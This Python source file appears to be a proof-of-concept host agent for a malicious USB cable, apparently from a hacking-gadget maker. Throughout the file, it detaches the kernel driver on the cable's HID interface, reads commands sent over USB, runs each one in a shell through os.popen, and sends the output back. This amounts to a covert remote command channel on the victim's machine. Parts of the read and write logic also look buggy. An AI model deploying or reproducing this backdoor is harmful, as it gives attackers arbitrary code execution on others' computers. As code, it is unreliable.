# NOTE: This is a POC only
# This has certain limitations on size of packets and writes
# You may need root access to use this.
# mischief gadgets, wasabi 2023

##### 
##### NOTE: THIS REQUIRES pyusb and libusb (either via pip3 install libusb_package or libusb1.0 library on your system)
#####

import os
import sys
import pkgutil
import usb.core as uc
import usb.util as uu
import importlib

# CHANGE THESE TO YOUR CABLES VID AND PID
vid = 0xd3c0
pid = 0xd34d

from pprint import pprint

class HIDX():
    def __init__(self,vid=None,pid=None):
        # device information and endpoints
        self.vid = None
        self.pid = None
        self.int = None
        self.dev = None
        self.dev_backend = None
        self.reattach = False
        self.cfg = None
        # code handlers for errors and messages
        self.send_buff = b""
        self.recv_buff = b""
        self.read_errors = 0
        self.write_errors = 0
        # start things if we need...
        if vid and pid:
            self.setup_dev(vid=vid,pid=pid)
            self.vid = vid
            self.pid = pid

    def do_cmd(self,cmd):
        c = os.popen(cmd)
        r = c.read()
        return r

    def setup_dev(self,vid,pid):
        dev = None
        print(f"Attempting to find Device: V={vid},P={pid}")
        try:
            dev = uc.find(idVendor=vid, idProduct=pid)
            self.dev_backend = "pyusb"
        except uc.NoBackendError:
            if pkgutil.find_loader('libusb_package'):
                libusb_package = importlib.import_module('libusb_package')
                self.dev_backend = "libusb_package"
                dev = libusb_package.find(idVendor=0xd3c0, idProduct=0xd34d)
            else:
                print("No suitable backend was found. Attempted to use libusb (pyusb) and libusb_package+pyusb. ")
                return False
        if not dev:
            return False
        self.reattach = False
        try:
            if hasattr(dev,"is_kernel_driver_active") and dev.is_kernel_driver_active(2):
                self.reattach = True
                dev.detach_kernel_driver(2)
        except NotImplementedError:
            pass
        self.cfg = dev.get_active_configuration()
        self.int = self.cfg.interfaces()[2]
        self.dev = dev
        return True

    def write(self,msg=None, buffer_limit=8):
        endpoint = self.int.endpoints()[1]
        error = False
        write_bytes = 0
        if msg:
            self.send_buff+=bytes(msg,'utf-8')
        if len(self.send_buff)>0:
            try:
                    part = b""
                    if buffer_limit >= len(self.send_buff):
                        buffer_limit=self.send_buff
                        part = self.send_buff
                        self.send_buff = b''
                    else:
                        part = self.send_buff[buffer_limit:]
                        self.send_buff = self.send_buff[buffer_limit:]
                    endpoint.write(part)
                    write_bytes = len(part)
            except Exception as e:
                print(f"Error in write, {e}")
                error = True
        return error, write_bytes


    def _read(self, buffer_limit=32,report_size=8,timeout=500):
        endpoint = self.int.endpoints()[0]
        res = None
        error = False
        raw_message = b""
        recv_packets = 0
        recv_bytes = 0
        try:
            remainder = buffer_limit+report_size*2
            while (remainder > report_size):
                remainder -= report_size
                rawdata = bytes(self.dev.read(endpoint.bEndpointAddress, report_size, timeout)).rstrip(b"\x00")
                print(f"{remainder}/{report_size} = {rawdata}")
                raw_message+=rawdata
                recv_packets += 1
                recv_bytes += len(rawdata)
        except uc.USBTimeoutError:
            pass
        except uc.USBError:
            print("Lost device, must attempt to reconnect.")
            #self.reattach=True
            #self.setup_dev(self.vid,self.pid)
            pass # for now so we just time out eventually
        # do a decode
        if recv_packets>0:
            data_str = ""
            for c in raw_message:
                data_str += chr(c)
            res = data_str
        else:
            pass

        return error, recv_packets, recv_bytes, res
        
    def read(self, retries=2):
        raw_message = b""
        empty_message = 0
        error = False
        recv_bytes=0
        recv_packet=0
        while retries:
            error, recv_packet, recv_byte, raw_data = self._read()
            recv_bytes+=recv_byte
            recv_packet+=recv_packet
            if error:
                print("! Error detected in read()")
                return raw_message
            if recv_byte == 0:
                empty_message+=1
            else:
                raw_message+=bytes(raw_data,'utf-8')
            if empty_message>retries:
                retries-=1
        print("debug: listening for data")
        return error, recv_packet, recv_bytes, raw_message

        

    def start(self,max_errors=5):
        iter = 1
        clear_errcnt = 0 
        while self.write_errors < max_errors and self.read_errors < max_errors:
            result = None
            read_error, recv_packet, recv_bytes, raw_message = self.read()
            if read_error:
                self.read_errors+=1
            else:
                if recv_bytes> 0 and len(raw_message)>1:
                    commands = raw_message.decode("utf-8").rstrip().replace("\\n","\n").split("\n")
                    print("raw data from queue:")
                    pprint(commands)
                    for command in commands:
                        cleaned_command = command.rstrip().replace("\n","").replace("\r","").rstrip().strip()
                        print(f"RECV: '{cleaned_command}'\n")
                        result = self.do_cmd(cleaned_command)
                        print(f"RESULT:\n{result}\n------\n")
                    clear_errcnt += 1
                    commands = []
            self.write(result)
            iter += 1
            if (clear_errcnt > 24):
                self.read_errors = 0
                self.write_errors = 0
    
hdx = HIDX(vid=vid,pid=pid)
hdx.start()
